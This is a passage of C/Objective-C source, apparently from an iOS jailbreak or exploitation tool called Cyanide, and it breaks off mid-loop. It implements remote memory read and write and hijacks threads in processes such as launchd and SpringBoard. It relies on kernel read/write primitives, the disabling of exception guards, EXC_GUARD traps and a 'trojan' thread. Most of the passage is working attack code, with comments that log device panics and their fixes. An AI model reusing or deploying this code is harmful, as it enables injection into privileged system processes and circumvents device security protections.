    return g_RC_vphoneBridge ||
           g_RC_taskAddr ||
           MACH_PORT_VALID(g_RC_firstExceptionPort) ||
           MACH_PORT_VALID(g_RC_secondExceptionPort) ||
           g_RC_firstExceptionPortAddr ||
           g_RC_secondExceptionPortAddr ||
           g_RC_dummyThread ||
           MACH_PORT_VALID(g_RC_dummyThreadMach) ||
           g_RC_dummyThreadAddr ||
           g_RC_dummyThreadTro ||
           g_RC_vmMap ||
           g_RC_callThreadAddr ||
           g_RC_trojanThreadAddr ||
           g_RC_pid ||
           g_RC_trojanMem;
}

struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr) {
            g_RC_shmemUseCounter[i] = ++g_RC_shmemClock;
            return &g_RC_shmemCache[i];
        }
    }
    return NULL;
}

struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
{
    int slot = -1;
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!g_RC_shmemCache[i].used) { slot = i; break; }
    }
    if (slot < 0) {
        uint64_t oldest = UINT64_MAX;
        for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
            if (g_RC_shmemUseCounter[i] < oldest) {
                oldest = g_RC_shmemUseCounter[i];
                slot = i;
            }
        }
        if (slot < 0) {
            printf("[%s:%d] g_RC_shmemCache eviction failed\n", __FUNCTION__, __LINE__);
            return NULL;
        }
        release_shmem_slot(slot);
        uint64_t events = ++g_RC_shmemEvictions;
        if (events == 1 || (events % 256) == 0) {
            printf("[RemoteCall] shmem cache LRU evicted slot=%d events=%llu\n",
                   slot, (unsigned long long)events);
        }
    }
    g_RC_shmemCache[slot] = *shmem;
    g_RC_shmemCache[slot].used = true;
    g_RC_shmemUseCounter[slot] = ++g_RC_shmemClock;
    return &g_RC_shmemCache[slot];
}

struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
{
    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
    if (cached) return cached;

    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    if (!newShmem.localAddress) {
        static volatile uint64_t shmemRetryEvents = 0;
        uint64_t events = __sync_add_and_fetch(&shmemRetryEvents, 1);
        if (events == 1 || (events % 64) == 0) {
            printf("[RemoteCall] shmem map failed page=0x%llx; clearing cache and retrying event=%llu\n",
                   pageAddr, (unsigned long long)events);
        }
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("shmem_retry");
        newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    }
    if (!newShmem.localAddress)
            return NULL;
    return put_shmem_in_cache(&newShmem);
}

bool remote_read(uint64_t src, void *dst, uint64_t size)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    bool res = remote_read_internal(src, dst, size);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

bool remote_read_internal(uint64_t src, void *dst, uint64_t size)
{
    if (g_RC_vphoneBridge)
        return rc_vphone_bridge_read(src, dst, size);

    if (!src || !dst || !size) return false;
    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & PAGE_MASK;
        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_read failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
        src     += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

uint64_t remote_read64(uint64_t src)
{
    uint64_t val = 0;
    if (!remote_read(src, &val, sizeof(val))) return 0;
    return val;
}

void remote_hexdump(uint64_t remoteAddr, size_t size)
{
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) {
        return;
    }

    if (!remote_read(remoteAddr, buf, size)) {
        printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
        free(buf);
        return;
    }

    char ascii[17];
    ascii[16] = '\0';
    for (size_t i = 0; i < size; ++i) {
        if ((i % 16) == 0)
            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);

        printf("%02X ", buf[i]);
        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) printf(" ");
                for (size_t j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");
                printf("|  %s \n", ascii);
            }
        }
    }

    free(buf);
}

bool remote_write(uint64_t dst, const void *src, uint64_t size)
{
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    bool res = remote_write_internal(dst, src, size);
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    return res;
}

bool remote_write_internal(uint64_t dst, const void *src, uint64_t size)
{
    if (g_RC_vphoneBridge)
        return rc_vphone_bridge_write(dst, src, size);

    if (!src || !dst || !size) return false;

    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until   = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & PAGE_MASK;
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }

        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
        dst     += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

bool remote_write64(uint64_t dst, uint64_t val)
{
    return remote_write(dst, &val, sizeof(val));
}

bool remote_writeStr(uint64_t dst, const char *str)
{
    if (!str) return false;

    size_t len = strlen(str) + 1;
    return remote_write(dst, str, len);
}

uint64_t remote_call_trojan_mem(void)
{
    return g_RC_trojanMem;
}

uint64_t retry_first_thread(bool useMigFilterBypass) {
    if (useMigFilterBypass)
        mig_bypass_pause();

    sleep(1);

    if (useMigFilterBypass)
        mig_bypass_resume();

    return kread64(g_RC_taskAddr + off_task_threads_next);
}

// Abort helper for init_remote_call_internal: on any failure AFTER a target
// thread has been injected/trapped, put the thread back BEFORE any teardown,
// using pure Mach IPC (exception replies) — no KRW, no PAC re-signing — so the
// restore works even if the KRW sockets were torn down underneath us. Replies
// carry the thread's ORIGINAL state exactly as the kernel delivered it in the
// trap message, which is already correctly signed.
//   trapStage 0: no trap consumed yet — only drain strays (a thread may have
//                trapped just as the first-exception wait timed out).
//   trapStage 1: main thread trapped, first reply still pending (*pendingExc).
//   trapStage 2: main thread replied and now runs the trojan loop (re-traps).
static void rc_restore_trapped_thread_for_abort(mach_port_t port, int trapStage,
                                                ExceptionMessage *pendingExc,
                                                const char *process)
{
    if (trapStage == 2) {
        // The thread re-traps almost immediately (its PC is bogus by design).
        // Round 19: classify before answering — the original state must ONLY
        // go to a sentinel park trap. A late EXC_GUARD stray queued ahead gets
        // its own state and we keep waiting; a crash gets re-parked into the
        // creator protocol (its re-trap is a park trap we then restore).
        for (int attempt = 0; attempt < 4; attempt++) {
            ExceptionMessage rex;
            if (!wait_exception(port, &rex, 3000, false)) {
                printf("[RC] thread restore: no re-trap within 3 s (attempt %d) — "
                       "clearing pending AST_GUARD on injected threads via KRW "
                       "as last resort\n", attempt + 1);
                if (kexploit_krw_ready()) {
                    for (NSNumber *t in g_RC_threadList)
                        clear_guard_exception(t.unsignedLongLongValue);
                }
                break;
            }
            if (rc_exc_is_park_trap(&rex)) {
                g_RC_originalState.__flags = rex.threadState.__flags;
                reply_with_state(&rex, &g_RC_originalState);
                printf("[RC] thread restore: trapped %s thread put back from trojan "
                       "loop via original-state reply\n", process);
                break;
            }
            if (rex.exception == EXC_GUARD) {
                printf("[RC] thread restore: abort wait released a late EXC_GUARD "
                       "stray with its own state (attempt %d)\n", attempt + 1);
                reply_with_state(&rex, &rex.threadState);
                continue;
            }
            rc_reply_crash_repark(&rex, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR,
                                  "abort restore");
        }
    }
    // Round 34 (panic-full-2026-10-03-215535: launchd thread 17081 parked on
    // Cyanide pid 497 → watchdog timeout, 90 s): do NOT drain strays here.
    // The old stray-drain loop dequeued every pending trap with wait_exception,
    // and for a sentinel PARK TRAP it then DROPPED the message — it logged
    // "left queued for the teardown drain" and continue'd, but wait_exception
    // had ALREADY consumed it, so it was NOT queued. The parked launchd thread
    // was stranded on a message nothing could ever see again: abandon's drain
    // found drained=0, the zero-parked invariant falsely "held," and ~90 s
    // later launchd wedged the device. This violated the responder's own rule
    // (rc_firstport_responder_main): "every dequeued message must get one
    // reply, or the thread is parked on a message the teardown drain can no
    // longer see."
    //
    // The fix (user-chosen "safer" variant): leave EVERY residual trap in the
    // port queue. Every caller of this function proceeds to abandon_remote_call
    // / destroy_remote_call_internal, whose symmetric teardown (unarm ->
    // rc_drain_stray_traps on both ports -> rc_teardown_verify_zero_parked with
    // its settle + second pass) runs BEFORE the ports are destroyed and is the
    // only code that restores a park trap correctly (trojan -> ORIGINAL state,
    // synthetic -> pthread_exit) and resumes non-park EXC_GUARD strays with
    // their own state — exactly what this loop used to do for the non-park
    // case, minus the park-trap drop. Nothing is consumed-and-dropped here, so
    // the one-reply-per-dequeued-message invariant can no longer be violated on
    // the abort path. (The trapStage==2 block above still restores the PRIMARY
    // trapped thread and replies to everything it dequeues; this only removes
    // the buggy secondary stray drain.)
    printf("[RC] thread restore: leaving residual trapped %s thread(s) queued "
           "for the symmetric teardown drain (no stray-drain here — it dropped "
           "park traps and stranded launchd threads)\n", process);
    if (trapStage == 1 && pendingExc) {
        reply_with_state(pendingExc, &g_RC_originalState);
        printf("[RC] thread restore: trapped %s thread resumed with original state "
               "(first reply)\n", process);
    }
}

// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
// The whole hijack lifecycle (inject → wait-for-trap → hijack → run → restore)
// runs under the in-flight guard so the background/lock/idle KRW detach paths
// cannot tear the primitive down while a target thread is trapped or running
// redirected state — that strands the thread inside launchd and watchdogs the
// device (live 9.log: 13:42:57 / 16:24:58 black-screens).
int init_remote_call(const char* process, bool useMigFilterBypass) {
    if (!remote_call_inflight_begin("init-hijack")) {
        remote_call_note_init_failure(RemoteCallInitFailureKRWUnavailable, 0);
        return -1;
    }
    // Round 20 HARD single-flight invariant: at most ONE init in flight
    // process-wide, enforced HERE and not only at call sites. The 071602
    // watchdog panic came from a call-site bug (the pre-warm released
    // pm_kill_lock mid-init, so the kill's round-7 attach "waited" 0 ms and
    // stacked a second hijack): two concurrent inits armed the SAME launchd
    // threads with DIFFERENT ports, consumed each other's protocol traps, and
    // left a launchd XPC worker parked at a sentinel with no responder —
    // watchdogd turnstile-blocked on it and stopped checking in. A blocked
    // contender simply waits; a stop request latches until the in-flight
    // count drains, so a queued init behind an aborted one aborts instantly
    // at its own walk-top checkpoint.
    static pthread_mutex_t g_rc_init_mutex = PTHREAD_MUTEX_INITIALIZER;
    static _Atomic int g_rc_init_contenders = 0;
    int contenders = atomic_fetch_add_explicit(&g_rc_init_contenders, 1,
                                               memory_order_acq_rel);
    if (contenders > 0) {
        printf("[RC] INIT SINGLE-FLIGHT: another init_remote_call is in flight "
               "— this init BLOCKS on the global init mutex (contenders=%d). "
               "Two concurrent hijacks arm the same target threads and "
               "sabotage each other (071602 watchdog panic); serialization is "
               "mandatory.\n", contenders + 1);
    }
    pthread_mutex_lock(&g_rc_init_mutex);
    atomic_fetch_sub_explicit(&g_rc_init_contenders, 1, memory_order_acq_rel);
    if (contenders > 0)
        printf("[RC] INIT SINGLE-FLIGHT: previous init finished — proceeding\n");
    int rc = init_remote_call_internal(process, useMigFilterBypass);
    if (rc == 0) {
        // Round 22: reap dead sessions' leaked sentinel-parked threads
        // (launchd landmines — the initproc-exited/SIGBUS accumulator) BEFORE
        // registering this session's parked threads as live. Cold path only:
        // the warm-path kill reuses the session and never re-inits.
        rc_sweep_leaked_landmines();
        rc_live_parked_add(g_RC_trojanThreadAddr);
        rc_live_parked_add(g_RC_callThreadAddr);
    }
    pthread_mutex_unlock(&g_rc_init_mutex);
    remote_call_inflight_end("init-hijack");
    return rc;
}

static int init_remote_call_internal(const char* process, bool useMigFilterBypass) {
    clear_remote_shmem_cache();
    remote_call_note_init_failure(RemoteCallInitFailureNone, 0);
    g_RC_vphoneBridge = false;
    // The default (non-session-object) state is NOT memset between sessions —
    // drop any previous session's cached PAC keys so a stale cache can never
    // sign for a target task that no longer exists.
    g_RC_pacKeysCached = false;
    g_RC_pacKeyA = 0;
    g_RC_pacKeyB = 0;

    if (cyanide_vphone_debug_build() &&
        process && strcmp(process, "SpringBoard") == 0) {
        if (rc_vphone_bridge_ping()) {
            g_RC_vphoneBridge = true;
            g_RC_success = true;
            g_RC_creatingExtraThread = true;
            g_RC_pid = (int)rc_vphone_bridge_call(2, 0, "getpid",
                                                  0, 0, 0, 0, 0, 0, 0, 0);
            if (g_RC_pid <= 0) g_RC_pid = 1;
            printf("[VPHONE-BRIDGE] using SpringBoard bridge pid=%d\n", g_RC_pid);
            return 0;
        }
        printf("[VPHONE-BRIDGE] SpringBoard bridge unavailable; falling back to KRW RemoteCall\n");
    }

    if (!kexploit_krw_ready()) {
        printf("[%s:%d] KRW unavailable; refusing RemoteCall init for %s\n",
               __FUNCTION__, __LINE__, process);
        remote_call_note_init_failure(RemoteCallInitFailureKRWUnavailable, 0);
        return -1;
    }

    // Round 24 (142628): never START a hijack while the lifecycle gate is
    // closed. Arming and every sign are refused deterministically while
    // backgrounded/terminating, so an init started in that state can only
    // fail — pre-24 it still walked launchd's threads and storm-retried for
    // ~9 s first (the kill(609) warm-up that ran 800 ms after the gate
    // closed). Refuse up front: nothing created, nothing armed, fail fast.
    if (excport_gate_blocked()) {
        printf("[RC] init: lifecycle gate closed (backgrounded/terminating) — "
               "refusing to START a %s hijack; nothing created or armed\n",
               process ?: "?");
        remote_call_note_init_failure(RemoteCallInitFailureLifecycleGated, 0);
        return -1;
    }

    uint64_t procAddr;
    if (g_RC_targetProcOverride) {
        procAddr = g_RC_targetProcOverride;
        g_RC_targetProcOverride = 0;
        printf("[%s:%d] using caller-supplied proc override for %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
    } else {
        procAddr = proc_find_by_name(process);
    }
    if (!procAddr || procAddr == (uint64_t)-1 || !is_kaddr_valid(procAddr + off_proc_p_pid)) {
        printf("[%s:%d] process not found or invalid: %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
        remote_call_note_init_failure(RemoteCallInitFailureProcessMissing, 0);
        return -1;
    }
    uint32_t targetPid = kread32(procAddr + off_proc_p_pid);
    printf("[RemoteCall] Found %s in kernel (pid=%u) — preparing EXC_GUARD thread hijack.\n", process, targetPid);
    RC_DEBUG("[%s:%d] process: %s, pid: %u\n", __FUNCTION__, __LINE__, process, targetPid);
    g_RC_taskAddr = proc_task(procAddr);
    if (!g_RC_taskAddr || !is_kaddr_valid(g_RC_taskAddr)) {
        printf("[%s:%d] invalid task for process %s proc=%#llx task=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr, g_RC_taskAddr);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }

    uint64_t selfTask = task_self();
    if (!selfTask || !is_kaddr_valid(selfTask)) {
        printf("[%s:%d] invalid self task while preparing %s RemoteCall task=%#llx\n",
               __FUNCTION__, __LINE__, process, selfTask);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] targetTask=%#llx selfTask=%#llx\n",
             __FUNCTION__, __LINE__, g_RC_taskAddr, selfTask);

    mach_port_t firstExceptionPort = create_exception_port();
    mach_port_t secondExceptionPort = create_exception_port();

    RC_DEBUG("[%s:%d] firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", __FUNCTION__, __LINE__, firstExceptionPort, secondExceptionPort);

    if (!firstExceptionPort || !secondExceptionPort)
    {
        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureExceptionPort, targetPid);
        return -1;
    }

    // Make sure the task won't crash after we handle an exception.
    // Round 21 (T3): save the original task_exc_guard flags; EVERY teardown
    // path (destroy / abandon / init-failure) restores them — see
    // rc_restore_task_exc_guard.
    uint32_t origExcGuard = 0;
    if (disable_excguard_kill_save(g_RC_taskAddr, &origExcGuard) != 0) {
        printf("[%s:%d] failed to prepare task_exc_guard for %s task=%#llx\n",
               __FUNCTION__, __LINE__, process, g_RC_taskAddr);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureTaskGuard, targetPid);
        return -1;
    }
    g_RC_taskExcGuardOrig = origExcGuard;
    g_RC_taskExcGuardSaved = true;

    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?

    uint64_t firstPortAddr = task_get_ipc_port_kobject(selfTask, firstExceptionPort);
    uint64_t secondPortAddr = task_get_ipc_port_kobject(selfTask, secondExceptionPort);
    if (!firstPortAddr || !secondPortAddr)
        RC_DEBUG("[%s:%d] exception port kobjects first=%#llx second=%#llx (receive ports may have no kobject)\n",
                 __FUNCTION__, __LINE__, firstPortAddr, secondPortAddr);

    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    if (!dummyFunc) {
        printf("[%s:%d] dlsym(getpid) failed while preparing dummy thread\n",
               __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] creating local dummy thread for RemoteCall bootstrap\n",
             __FUNCTION__, __LINE__);
    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    if (dummyErr != 0 || !dummyThread) {
        printf("[%s:%d] pthread_create_suspended_np(dummy) failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, dummyErr, dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    if (!dummyThreadMach) {
        printf("[%s:%d] pthread_mach_thread_np(dummy) returned null\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadMach=0x%x\n",
             __FUNCTION__, __LINE__, dummyThreadMach);
    uint64_t dummyThreadAddr = task_get_ipc_port_kobject(selfTask, dummyThreadMach);
    if (!is_kaddr_valid(dummyThreadAddr)) {
        printf("[%s:%d] failed to resolve dummy thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, dummyThreadMach, dummyThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadAddr=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadAddr);
    uint64_t dummyThreadTro = kread64(dummyThreadAddr + off_thread_t_tro);
    if (!is_kaddr_valid(dummyThreadTro)) {
        printf("[%s:%d] dummy thread tro invalid %#llx\n",
               __FUNCTION__, __LINE__, dummyThreadTro);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadTro=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadTro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = task_get_ipc_port_kobject(selfTask, threadSelf);
    if (!is_kaddr_valid(selfThreadAddr)) {
        printf("[%s:%d] failed to resolve self thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, threadSelf, selfThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        mach_port_deallocate(mach_task_self_, threadSelf);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
    RC_DEBUG("[%s:%d] selfThreadAddr=%#llx selfThreadCtid=%#x\n",
             __FUNCTION__, __LINE__, selfThreadAddr, selfThreadCtid);
    mach_port_deallocate(mach_task_self_, threadSelf);

    g_RC_creatingExtraThread = true;
    g_RC_firstExceptionPort = firstExceptionPort;
    g_RC_secondExceptionPort = secondExceptionPort;
    g_RC_firstExceptionPortAddr = firstPortAddr;
    g_RC_secondExceptionPortAddr = secondPortAddr;
    g_RC_dummyThread = dummyThread;
    g_RC_dummyThreadMach = dummyThreadMach;
    g_RC_dummyThreadAddr = dummyThreadAddr;
    g_RC_dummyThreadTro = dummyThreadTro;
    g_RC_selfThreadAddr = selfThreadAddr;
    g_RC_selfThreadCtid = selfThreadCtid;

    g_RC_threadList = [NSMutableArray new];

    // Round 7: inject into 6 threads instead of 2. The warm-up wait is the time
    // until the FIRST injected thread next touches a guarded Mach port right —
    // with 2 possibly-idle launchd threads that was 2–7.2 s on device. The
    // minimum over 6 threads lands much sooner. Bounded (launchd has dozens of
    // threads; the walk below caps at 12 candidates). Every injected thread is
    // in g_RC_threadList and fully accounted for: guard cleared after the first
    // trap and on every abort path, near-simultaneous traps answered in the
    // post-trap drain, late traps answered by the first-port responder for the
    // session's life, residual traps drained at teardown (round-5 symmetry).
    int targetInjectedThreadCount = 6;
    uint64_t tInjectStartNs = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
    g_RC_lastInitInjected = 0;
    g_RC_lastInitTrapMs = 0;
    RC_DEBUG("[%s:%d] Target injected threads: %d\n",
             __FUNCTION__, __LINE__, targetInjectedThreadCount);

    // Round 13: bounded-retry arming. One 10 s trap-wait behind a single
    // candidate set converted "all armed launchd threads were blocked" into a
    // full stall and error -7 (live 18.log 21:32:45: injected=1, no trap in
    // 10 s; the user's manual retry 27 s later trapped in 852 ms). Now: up to
    // 3 attempts of (fresh walk → arm → capped wait). Each attempt re-reads
    // the thread-list head (launchd's threads churn constantly), SKIPS threads
    // armed by a previous attempt (they proved they won't trap — re-arming
    // them just waits again), and waits at most 4 s (historical successful
    // traps: 0.5-2.5 s; a trap that takes longer is never coming). The TOTAL
    // wait budget is unchanged (firstExceptionTimeoutMS: 10 s fastkill →
    // 4+4+2; the 120 s session default → 4+4+112). Every attempt's armed
    // threads are un-armed and stray-drained before the next walk — no
    // orphaned AST_GUARD outlives a failed attempt (195243-class).
    // (The walk/wait body below keeps its original indentation.)
    int retryCount = 0;
    int validThreadCount = 0;
    int successThreadCount = 0;
    int walkedLinks = 0;   // round 8: end-of-list vs corrupt-link diagnostics
    int walkSkips = 0;     // round 8: dead-slot skips (rate-limited logging)
    // Round 26: cycle detection for a list that mutates MID-WALK. The 64-link
    // cap already bounds the iteration count (a userspace spin is impossible),
    // but a cycle — a freed thread's next pointer re-linked to an earlier node
    // while launchd churns threads (e.g. relaunching the app the user just
    // killed, live 29.log 16:01:29-30) — would re-visit and RE-ARM the same
    // threads, inflating armed counts and burning the whole 64-link budget on
    // duplicates. Sized to the walkedLinks cap.
    uint64_t walkedThreads[64];
    int walkedThreadCount = 0;
    int firstExceptionTimeoutMS = g_RC_firstExceptionTimeoutMS > 0 ? g_RC_firstExceptionTimeoutMS : 120000;
    const int kMaxArmAttempts = 3;
    const int kAttemptWaitCapMS = 4000;
    // Round 30 (panic-full-2026-10-03-184716, watchdog: rbd checkins stopped):
    // HARD overall init budget. The attempt caps (3 x <=4 s) still let an init
    // hold the RemoteCall guard for 12+ s, and 184716 showed the guard held
    // 130 s while rbd waited -> device panic. After this budget the init MUST
    // abort wherever it is: un-arm, drain strays with their own states, drop
    // the session. (No userspace mechanism can abort a thread already
    // TH_UNINT inside the exception-ports MIG trap — that window is shrunk by
    // the round-30 willResignActive early gate + pre-trap stop checks; this
    // budget bounds everything userspace CAN bound.)
    const uint64_t kInitHardBudgetNs = 8ULL * 1000000000ULL;   // 8 s
    const uint64_t initStartNs = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW);
    uint64_t triedThreads[16];
    int triedCount = 0;
    int totalWaitedMS = 0;
    uint64_t firstThread = 0;
    ExceptionMessage exc;
    bool gotFirstTrap = false;

    for (int armAttempt = 1; armAttempt <= kMaxArmAttempts && !gotFirstTrap; armAttempt++) {
        // Round 24: the gate can close between entry and any attempt (a lock /
        // background lands mid-init). Arming is refused deterministically in
        // that state — fail FAST instead of storm-retrying (142628: 3 attempts
        // × 3 retries ≈ 9 s of guaranteed-refused arms). Nothing is armed at
        // attempt top, so abandon is the correct symmetric teardown.
        if (excport_gate_blocked()) {
            printf("[RC] init: lifecycle gate closed before arm attempt %d/%d — "
                   "failing FAST (deterministic refusal; a retry storm cannot "
                   "succeed while backgrounded)\n", armAttempt, kMaxArmAttempts);
            remote_call_note_init_failure(RemoteCallInitFailureLifecycleGated, targetPid);
            abandon_remote_call();
            return -1;
        }
        // Fresh list head each attempt — churn may have replaced the whole
        // candidate set since the last walk.
        firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
        if (!firstThread || !is_kaddr_valid(firstThread)) {
            printf("[%s:%d] invalid first thread for process %s task=%#llx firstThread=%#llx\n",
                   __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstThread);
            remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
            destroy_remote_call();
            return -1;
        }
        uint64_t currThread = firstThread;
        retryCount = 0;
        validThreadCount = 0;
        successThreadCount = 0;
        walkedLinks = 0;
        walkSkips = 0;
        walkedThreadCount = 0;   // round 26: fresh cycle-detection set per attempt
        g_RC_trojanThreadAddr = 0;
        g_RC_pacKeysCached = false;
        [g_RC_threadList removeAllObjects];
        if (armAttempt > 1)
            printf("[RC] init: arm attempt %d/%d — fresh walk, skipping %d "
                   "previously-armed thread(s) that never trapped\n",
                   armAttempt, kMaxArmAttempts, triedCount);

    // Round 11: ground-truth thread count for the "launchd has far more
    // threads" verdict below. The round-10 code read a HARDCODED guess
    // (off_task_threads_next + 16) that was wrong for this build — it logged
    // "implausible (1016011776)", a pointer fragment. Wrong-offset kreads are
    // not acceptable even for diagnostics: the offset now comes from
    // process.m's suspend_count calibration, which proves the
    // thread_count/active/suspend_count triple unique against our own task
    // and cross-checks it against launchd's (task layout: thread_count at
    // suspend_count - 8). Uncalibrated -> chain-head log only, exactly as
    // the pre-diagnostic behavior.
    if (armAttempt == 1) {   // diagnostic once per init, not per attempt
        int tcOff = procmgr_task_thread_count_offset();
        uint32_t taskThreadCount = 0;
        if (tcOff > 0)
            taskThreadCount = kread32(g_RC_taskAddr + (uint32_t)tcOff);
        if (taskThreadCount >= 1 && taskThreadCount <= 4096) {
            printf("[RC] walk: %s task thread_count=%u (calibrated +0x%x, chain head %#llx) — "
                   "calibrating end-of-list verdict\n",
                   process, taskThreadCount, tcOff, firstThread);
        } else {
            printf("[RC] walk: %s task thread_count unavailable (%s, chain head %#llx)\n",
                   process, tcOff > 0 ? "implausible read at calibrated offset"
                                      : "offset not calibrated this session",
                   firstThread);
        }
    }

    if (useMigFilterBypass)
        mig_bypass_resume();

    while (successThreadCount < targetInjectedThreadCount && validThreadCount < 12 &&
           retryCount < 3 && walkedLinks < 64) {
        // Round 10: a background/terminate stop request must abort the walk
        // NOW, not after up to 12 more candidates. Whatever is already armed
        // gets un-armed (request_stop disarms the snapshot too — this clear
        // covers threads armed after that pass), strays are drained with
        // their own states, and the session is dropped. No thread is left
        // armed or parked when the app leaves the foreground.
        if (remote_call_stop_requested()) {
            printf("[RC] init: stop requested mid-walk (%d armed, %d candidate(s)) "
                   "— un-arming and aborting hijack\n",
                   successThreadCount, validThreadCount);
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
                rc_livearm_unregister(thread.unsignedLongLongValue);
            }
            rc_armed_snapshot_forget();
